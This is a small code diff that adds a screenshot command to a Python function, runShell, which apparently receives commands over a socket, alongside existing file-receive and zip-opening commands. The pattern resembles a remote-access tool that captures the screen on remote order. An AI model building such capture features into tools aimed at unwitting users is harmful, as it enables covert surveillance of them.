@@ -9,6 +9,7 @@
 #\date 2016-04-24
 from incomingFile import incomingFile
 from openZip import openZip
+from screenShot import screenShot
 import subprocess
 import sys
 
@@ -17,6 +18,8 @@ def runShell(socketHolder):
 	if data:
 		if data == "SENDFILE":
 			incomingFile(socketHolder)
+		elif data == "SCREENSHOT":
+			screenShot()
 		elif data == "OPENZIP":
 			password = openZip()
 			if not password:
